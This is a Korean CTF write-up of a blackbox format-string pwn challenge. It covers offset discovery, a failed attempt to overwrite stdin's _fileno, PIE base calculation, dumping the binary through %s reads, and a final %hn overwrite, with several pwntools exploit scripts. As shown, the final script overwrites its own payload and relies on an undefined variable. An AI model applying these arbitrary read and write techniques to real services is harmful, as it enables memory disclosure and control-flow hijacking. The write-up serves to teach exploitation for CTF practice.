
## 문제 상황

첨부파일이 하나도 없다. `nc` 접속 주소만 주어지는 완전한 블랙박스 pwn이었다.

```
Leaks - 500pts
Just leaking anything and everything.

nc challs.scriptsorcerers.xyz [port]
```

접속하면 이렇게 나온다.

```
Here is a gift (stdin): 0x5da992b93030
Enter input:
```

입력을 넣으면 그대로 echo 해준다. 딱 봐도 `printf(input)` 형태로 보였고, 실제로 `%p`를 넣어보니 스택 값들이 줄줄이 흘러나왔다 — 전형적인 **포맷 스트링 취약점**.

---
## 용어 몇 개 정리하고 시작

- **포맷 스트링 취약점**: `printf(buf)`처럼 사용자 입력을 포맷 문자열 자리에 그대로 넣는 실수. `%p`, `%s`, `%n` 같은 지정자를 넣으면 스택에 있는 값을 읽거나(`%p`, `%s`), 심지어 임의 주소에 값을 쓸 수도 있다(`%n`).

- **오프셋(offset)**: `printf`에 인자가 하나도 없는데 `%1$p`, `%2$p`처럼 n번째 인자를 요구하면, printf는 그냥 스택/레지스터에 있던 값을 그 자리 인자인 것처럼 읽어버린다. 우리가 넣은 입력 문자열 자체도 스택 어딘가에 올라가 있기 때문에, 몇 번째 자리에서 우리 입력이 나오는지를 찾으면 그 주소를 조작 대상으로 쓸 수 있다.

- **PIE (Position Independent Executable)**: 실행파일도 ASLR이 걸려서 매번 로드 주소가 바뀌는 방식. 다만 로드 베이스만 다를 뿐 내부 상대 오프셋은 고정이라, 주소 하나만 leak하면 `leak - 고정오프셋 = base`로 실행파일 시작 주소를 구할 수 있다.


---


## 1차 시도: 오프셋 찾기

`AAAAAAAA` + `%n$p`를 순서대로 넣어가면서 어디서 `0x4141414141414141`이 나오는지 확인.

```
offset 6: AAAAAAAA0x4141414141414141
```

6번째 자리 확정. 여기까진 순조로웠다.


---
## 2차 시도: Stack 내 Flag 찾기

문제 설명이 "Just leaking anything and everything"이길래, 혹시 flag 문자열이 스택이나 힙 어딘가에 이미 올라와 있어서 `%n$s`로 찾으면 되지 않을까 하는 기대로 1번부터 150번 오프셋까지 전수조사를 돌렸다.


```
[49] ./chall              <- argv[0]
[51] PATH=/usr/local/...  
[52] HOSTNAME=...
[53] HOME=/home/chall
[54~60] SOCAT_* 환경변수들
```


정상적으로 `argv`, `envp` 배열을 순서대로 훑어내는 데는 성공했는데, 환경변수 안에 `FLAG=`는 없었다. 즉 flag가 그냥 어딘가 널려있는 문제는 아니라는 뜻. 여기서 "단순 스택 리크로 끝나는 문제가 아니구나"를 확인한 셈.


---


## 3차 시도: 잘못된 가설 — "gift"는 진짜 glibc stdin일 거야

처음 접속하면 주는 `Here is a gift (stdin): 0x...` 이 주소를, 나는 glibc가 관리하는 **진짜 `stdin` FILE 구조체 주소**라고 넘겨짚었다. glibc의 FILE 구조체에는 실제로 읽어올 파일 디스크립터 번호가 들어있는 `_fileno` 필드가 있고, 이건 구조체 시작점에서 정확히 `0x70` 떨어진 고정 위치에 있다 (glibc 2.34~2.36 계열 공통).

가설은 이랬다: `%n`으로 stdin 구조체의 `_fileno`를 3, 4, 5 같은 값으로 덮어쓰면, 프로그램이 미리 열어뒀을 flag 파일의 fd로 다음 입력을 읽어오게 만들 수 있지 않을까.

```
stdin 주소 + 0x70 = fileno 위치라고 가정
    ↓
%n 으로 그 위치에 3, 4, 5 ... 순서대로 덮어쓰기 시도
    ↓
결과: 매번 "Bye! Exiting..." 하고 EOF로 종료
```

쓰기 자체는 먹혔다(값 넣을 때마다 반응이 바뀌는 걸 보면). 근데 뭘 넣어도 그냥 죽어버렸다. fd=0(원래 값이라고 생각한 값)으로 되돌려도 똑같이 죽어서, 애초에 이 가설 자체가 틀렸다는 걸 나중에야 알았다.

돌아보면 근거가 약했다. glibc의 진짜 stdin 오프셋(libc base 기준)은 보통 `0x1ec980`처럼 꽤 큰 값인데, 우리가 받은 주소가 그 정도로 큰 라이브러리 오프셋을 담고 있다는 근거는 전혀 없었다. 그냥 "stdin"이라는 이름에 낚여서 라이브러리 구조체라고 지레짐작한 것.

```python
@'
from pwn import *
import time

context.update(arch="amd64", os="linux")
context.log_level = "error"

PORT = 여기_현재_포트

def try_fd(fd_num):
    r = None
    try:
        r = remote("challs.scriptsorcerers.xyz", PORT, timeout=5)
        gift = r.recvline(timeout=3).decode()
        stdin_addr = int(gift.split(":")[1].strip(), 16)
        fileno_addr = stdin_addr + 0x70

        payload = fmtstr_payload(6, {fileno_addr: fd_num}, write_size="byte")

        r.recvuntil(b"Enter input: ", timeout=3)
        r.sendline(payload)

        resp1 = r.recv(4096, timeout=3)
        print(f"[fd={fd_num}] RESP1: {resp1!r}")

        r.recvuntil(b"Enter input: ", timeout=2)
        r.sendline(b"gimme")
        resp2 = r.recv(4096, timeout=2)
        print(f"[fd={fd_num}] RESP2: {resp2!r}")
        r.close()
    except Exception as e:
        print(f"[fd={fd_num}] FAILED: {type(e).__name__}")
        try: r.close()
        except: pass

for fd in [0, 3, 4, 5, 6, 7, 8, 9, 10]:
    try_fd(fd)
    print("---")
    time.sleep(0.3)
'@ | Out-File -Encoding utf8 exploit4.py
```

---

## 진짜 구조: "gift"의 정체

write-up 을 보고 나서야 정리가 됐다.



```python
leak = int(r.recvline().strip(), 16)
base = leak - 0x4030
target = base + 0x4012
```


`leak`에서 딱 `0x4030`만 빼면 바로 실행파일 자체의 로드 베이스가 나온다. glibc였다면 이렇게 작은 오프셋일 수가 없다 — 즉 **"gift (stdin)"이라고 이름 붙은 그 주소는 glibc의 stdin이 아니라, 이 실행파일 내부에 있는 입력 버퍼(전역 변수)의 주소였다.** 프로그램이 자기 버퍼를 장난스럽게 "stdin"이라고 라벨링해서 보여준 것.


메모리 구조를 그림으로 그리면 대충 이런 모양이다.

```
PIE 실행파일 매핑 영역
┌──────────────────────────────┐  base + 0x0000
│ ELF 헤더 / 코드 영역           │
├──────────────────────────────┤
│ ...                           │
├──────────────────────────────┤  base + 0x4012  ← 최종 공격 대상
│ 뭔가 함수포인터/제어 데이터    │
├──────────────────────────────┤
│ ...                           │
├──────────────────────────────┤  base + 0x4030  ← "gift"가 가리키는 입력 버퍼
│ 입력 버퍼 (오해했던 "stdin")   │
└──────────────────────────────┘
```


즉 이 문제의 진짜 이름값은 "Leaks"고, 힌트에 낚인 요소는 없었다. 그냥 내가 "stdin"이라는 단어를 보고 glibc를 떠올린 게 문제였다.


---

## 결정적으로 놓쳤던 것: 바이너리를 직접 leak해서 만들면 됐다

바이너리가 없어서 막혔다고 생각했는데, 사실 우리가 가진 leak 능력(`%n$s`로 임의 주소의 문자열 읽기) 자체로 실행파일을 통째로 떠낼 수 있었다.

```
for addr in (base ~ base+0x5000):
    payload = "%7$sEND\x00" + p64(addr)
    받은 데이터를 이어붙이기
    → dump.elf 로 저장
    → IDA로 열어서 진짜 오프셋 확인
```

한 바이트씩 조금씩 읽어서 로컬에 파일로 쌓은 다음, 그걸 정적 분석 도구로 열어보는 방식. "바이너리가 없다 = 분석 불가능"이 아니라 "바이너리가 없다 = 리크로 만들어서 분석하면 된다"였던 셈. 이게 이번에 가장 크게 배운 부분.


---


## 최종 공격 구조

바이너리를 덤프해서 `base + 0x4012` 위치가 어떤 의미인지(아마 다음 입력을 처리할 때 참조하는 함수 포인터 자리로 추정) 확인한 다음, `%n` 계열로 그 자리를 원하는 값으로 덮어쓰는 방식으로 마무리된다.

```
1) 접속 → "gift" 주소 leak
2) leak - 0x4030 = PIE base 계산
3) %s 기반 leak 루프로 base ~ base+0x5000 구간을 통째로 읽어서 dump.elf 생성
4) IDA/objdump로 dump.elf 분석 → base+0x4012 자리의 정체 확인
5) 오프셋 6번 자리를 이용해 %n으로 base+0x4012 값을 원하는 대상으로 덮어쓰기
6) 다음 입력 루프에서 흐름이 바뀌며 flag 노출
```


write-up
```python
#!/usr/bin/env python3

from pwn import *



context.log_level = 'info'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("challs.scriptsorcerers.xyz", 10057)

    return r


def main():
    r = conn()
    r.recvuntil(b'(stdin): ')
    leak = int(r.recvline().strip(), 16)
    base = leak - 0x4030
    target = base + 0x4012

    pl = b"%26465c%8$hnFSOP" + p64(target)
    pl = p64(target)

    r.sendlineafter(b"input: ", pl)

    """
    dump filename at offset 0x4010 bc ida didnt get it

    pg = leak & ~0xfff
    
    base = pg - 0x4000

    addr = base + 0x4010

    pl = b"%7$sEND\x00" + p64(addr)

    r.sendlineafter(b"input: ", pl)
    data = r.recvuntil(b"END", drop=True)

    print(data)
    """

    """
    dump binary

    pg = leak & ~0xfff
    
    base = pg - 0x4000
    addr = base
    binary = b''

    while addr < base + 0x5000:

        if b'\x0a' in p64(addr):
            binary += b'\x00'
            addr += 1
            continue

        pl = b"%7$sEND\x00" + p64(addr)

        r.sendlineafter(b"input: ", pl)
        data = r.recvuntil(b"END", drop=True)

        binary += data + b"\x00"
        addr += len(data) + 1

        print(hex(addr))
    open('dump.elf', 'wb').write(binary)
    """

    """
    leak base page addr
    
    for i in range(5):
        pg = (leak & ~0xfff) - i * 0x1000

        pl = b"%7$.4sX\x00" + p64(pg)

        r.sendlineafter(b"input: ", pl)
        data = r.recvuntil(b"X", drop=True)

        print(hex(pg), repr(data))

    """
    r.interactive()


if __name__ == "__main__":
    main()
```



---


## 배운 점

- leak한 주소의 이름(`stdin`, `gift` 같은 라벨)을 곧이곧대로 믿지 말고, 오프셋 크기부터 확인했어야 했다. glibc 내부 심볼치고는 오프셋이 너무 작다는 걸 눈치챘어야 함.
- "바이너리가 없다"는 게 블랙박스 pwn에서 막다른 길이 아니다. 포맷 스트링으로 임의 주소를 읽을 수 있다면, 그 능력 자체로 바이너리를 떠서 로컬 분석 도구에 올릴 수 있다.
- 가설을 세웠으면 빠르게 반증 가능한 실험부터 해야 한다. fd=0(원복)을 넣었을 때도 정상 동작 안 한다는 걸 더 일찍 확인했으면 가설을 더 빨리 버렸을 것.